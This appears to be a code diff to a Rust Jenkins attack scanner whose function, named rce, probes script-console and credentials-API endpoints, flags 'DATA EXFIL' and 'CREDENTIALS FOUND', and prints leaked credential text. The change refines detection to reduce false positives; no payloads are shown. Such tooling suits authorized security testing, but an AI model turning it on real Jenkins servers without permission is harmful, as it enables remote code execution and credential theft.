@@ -81,11 +81,17 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
         match client.get(&full_url).send().await {
             Ok(resp) => {
                 let status = resp.status().as_u16();
+                let has_jenkins_header = resp.headers().get("x-jenkins").is_some()
+                    || resp.headers().get("x-hudson").is_some();
                 let body = resp.text().await.unwrap_or_default();
-                let accessible = status == 200;
-                let has_json = body.contains("{") && body.contains("}");
-                let has_creds = body.contains("credential") || body.contains("secret") || body.contains("password");
-                let has_jobs = body.contains("job") || body.contains("build");
+                let is_html = body.starts_with("<!DOCTYPE") || body.starts_with("<html") || body.contains("<head>");
+                let is_jenkins = has_jenkins_header
+                    || body.contains("Jenkins") || body.contains("hudson")
+                    || body.contains("jenkins-") || body.contains("Jenkins-Crumb");
+                let accessible = status == 200 && is_jenkins && !is_html;
+                let has_json = body.contains("{") && body.contains("}") && !is_html;
+                let has_creds = is_jenkins && (body.contains("credential") || body.contains("\"secret\"") || body.contains("\"password\""));
+                let has_jobs = is_jenkins && (body.contains("\"jobs\"") || body.contains("\"builds\"") || body.contains("\"_class\""));
                 let has_script = path.contains("script");
                 let tag = if accessible {
                     if has_script { "SCRIPT CONSOLE".red().bold().to_string() }
@@ -99,13 +105,15 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                     "auth".yellow().to_string()
                 } else if status == 404 {
                     "not found".dimmed().to_string()
+                } else if status == 200 && is_html {
+                    "not jenkins".dimmed().to_string()
                 } else {
                     format!("status {}", status)
                 };
                 println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                 if accessible {
                     found.push(*name);
-                    if !path.contains("login") && status == 200 && !path.contains("script") {
+                    if !path.contains("login") && !path.contains("script") {
                         unauthenticated = true;
                     }
                     if has_creds {
@@ -133,11 +141,17 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
         {
             Ok(resp) => {
                 let status = resp.status().as_u16();
+                let has_jenkins_hdr = resp.headers().get("x-jenkins").is_some();
                 let resp_body = resp.text().await.unwrap_or_default();
-                let has_result = !resp_body.is_empty() && (resp_body.contains("Result:") || !resp_body.contains("error"));
-                let has_error = resp_body.contains("Exception") || resp_body.contains("GroovyError");
-                let has_data = resp_body.contains("root") || resp_body.contains("admin") || resp_body.contains("SECRET")
-                    || resp_body.contains("credential") || resp_body.contains("password") || resp_body.contains("open");
+                let is_html = resp_body.starts_with("<!DOCTYPE") || resp_body.starts_with("<html") || resp_body.contains("<head>");
+                let has_jenkins = has_jenkins_hdr
+                    || resp_body.contains("Jenkins") || resp_body.contains("hudson");
+                let has_error = resp_body.contains("Exception") || resp_body.contains("GroovyError") || resp_body.contains("java.lang.");
+                let has_result = !resp_body.is_empty() && !is_html && has_jenkins
+                    && (resp_body.contains("Result:") || !resp_body.contains("error"));
+                let has_data = !is_html && has_jenkins
+                    && (resp_body.contains("root:") || resp_body.contains("uid=") || resp_body.contains("SECRET")
+                        || resp_body.contains("\"credentials\"") || resp_body.contains("\"password\"") || resp_body.contains("\"open\""));
 
                 let tag = if has_data {
                     "DATA EXFIL".red().bold().to_string()
@@ -147,6 +161,8 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
                     "error".dimmed().to_string()
                 } else if status == 403 || status == 401 {
                     "auth".yellow().to_string()
+                } else if is_html {
+                    "not jenkins".dimmed().to_string()
                 } else {
                     format!("status {}", status)
                 };
@@ -168,9 +184,12 @@ pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result
     match client.get(&cred_url).send().await {
         Ok(resp) => {
             let status = resp.status().as_u16();
+            let has_jenkins = resp.headers().get("x-jenkins").is_some();
             let body = resp.text().await.unwrap_or_default();
-            let has_creds = body.contains("credential") || body.contains("Secret") || body.contains("Username");
-            let tag = if has_creds { "CREDENTIALS FOUND".red().bold().to_string() } else { format!("status {}", status) };
+            let is_html = body.starts_with("<!DOCTYPE") || body.starts_with("<html") || body.contains("<head>");
+            let has_creds = !is_html && has_jenkins
+                && (body.contains("\"credentials\"") || body.contains("\"secret\"") || body.contains("\"username\""));
+            let tag = if has_creds { "CREDENTIALS FOUND".red().bold().to_string() } else if is_html { "not jenkins".dimmed().to_string() } else { format!("status {}", status) };
             println!("  {} Credentials API: status={} {}", "*".cyan(), status, tag);
             if has_creds {
                 println!("    {} {}", ">".red().bold(), body.chars().take(300).collect::<String>());
